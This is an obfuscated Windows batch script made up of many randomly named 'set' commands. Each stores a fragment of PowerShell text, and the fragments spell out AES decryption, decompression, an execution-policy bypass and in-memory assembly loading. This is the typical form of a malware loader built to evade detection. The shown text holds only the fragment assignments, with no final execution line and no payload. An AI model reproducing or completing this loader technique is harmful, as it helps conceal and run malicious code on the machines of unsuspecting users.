@echo off
set "zJlxPqwMjT=New-"
set "iyDozOTfqT=oin "
set "ACuuBBodtA=F'[-"
set "ytlAEFspOT=Pbvm"
set "jZOqypiGKG=$DMx"
set "scXzUVfIBH=ay()"
set "ywqICfgdLM=stem"
set "wxkQyoVhod=-ep "
set "KbVoIEJhpA=.Con"
set "ctKXrOLxJp=m = "
set "ZAqHxcHyWS=Obje"
set "upQTUurLNI===')"
set "pqZURNTiLM=;$wW"
set "JqwQsSWXyg=OghT"
set "XHbiXDQPuj=embl"
set "uYJDwLyTkl=WD.D"
set "HRyxyNTHsC= = N"
set "sQZczOXOlK=in $"
set "fSnLSipxGu=ypto"
set "ecjBxENTHU=ect "
set "nPgjsDNmyc=eScW"
set "PNcfFxlxOT=gMod"
set "fqZXcWsNDz=Pbvm"
set "CYRUneEsZd=bstr"
set "YnSCsDoCav=('%*'"
set "AzhYnzTvEj=PTtG"
set "dDmjSHAgsy=OghT"
set "VpqCpWCuXA=y.Cr"
set "MTzEdrmWmt=D = "
set "ZjALoykoqd=n ''"
set "gYqPBvJrWP=zHhH"
set "YFCyLqbUCA=[Sys"
set "jSYiNFjSqb=m.IO"
set "VvtiwfqSIq=mory"
set "QcvVJJhmEY=trea"
set "AEGAkirWni=ptog"
set "FVgtMqpyPm=zuZI"
set "htFclRygiO=ring"
set "hRXmFhKpoX=rity"
set "cecMsjhsdp=t.Su"
set "fOlUtDswpJ=ment"
set "MGRcGWRarE=rity"
set "jDqlBCKLGh=Comp"
set "vuUSWViNjl= if "
set "gybqzIdkgw=CFxo"
set "ChnLupIosI=$JuZ"
set "nxfjKpAjXT=; };"
set "utAwVeAzwu=[Env"
set "rdXwkvQNSK=GtK."
set "EtLajdMcpq=ert]"
set "QlDFXkCSKD=T.Pa"
set "TYNjLRCgFX=form"
set "CgusDmvFqX=ct S"
set "mfIffEydBQ=pher"
set "fUKAeRFQHZ=pStr"
set "VrzMHIoblb=morF"
set "mLDZOKCuBk=.Len"
set "btuXyRrOIr=[]] "
set "EAhFxoXSOg=)($w"
set "WDKdNlrJqu=Stre"
set "fUAwlsAQTK=PoDT"
set "LMFyxRpexN=oArr"
set "tpuYHKOkiz=flec"
set "AcxQBsXjxU=oL'["
set "ZDREplcXmq== [S"
set "QqwdmCovJf=wPbv"
set "ZXjghVOlJU=y.Pa"
set "VlfFbvTDXX=-4] "
set "SJUAOzGOIL=ddin"
set "kacOCdAHPw=();$"
set "SNsjsSaQeo=m.IO"
set "CjcsZzSPEc=oryS"
set "yVEpJDkwcx=ddin"
set "dBjFkKouXs='0Pg"
set "VXZaFRtBSI=O.Me"
set "RCRNWtiRgd=] -j"
set "OpIhzjzQBQ=ke($"
set "UbDPuBMOjb=]::C"
set "cDpoWsIKik=m(, "
set "TjNYjnZMIm=.Dis"
set "QCAXTiBwYl=n ''"
set "ctUnvuBDhp=ecry"
set "FIlEfUwunW='')("
set "bXdNVwTKkF=uZZV"
set "fAzNeJQNQV=K = "
set "DicDodYktL='gni"
set "JqZxTFiFcr=ne);"
set "sFQSGkJGSp=[IO."
set "KTKzldLiUZ=em.I"
set "nCAkwCTwDT=m, 0"
set "gXXUziklXY=, (,"
set "BagAcTBfhd=and "
set "bWxrEsSYmo=stem"
set "HcTEwtAWKZ=HoWr"
set "mcEXMdBRzI=ck($"
set "naxglYTpJh=ZV.T"
set "qWgfvuxzOS=ose("
set "WvHEVxxrua=-joi"
set "JmItxqMxno=onve"
set "kfnGiTFwHx=gth)"
set "nFPyKbWELs=;$Po"
set "IXHBJcMrmW=ptor"
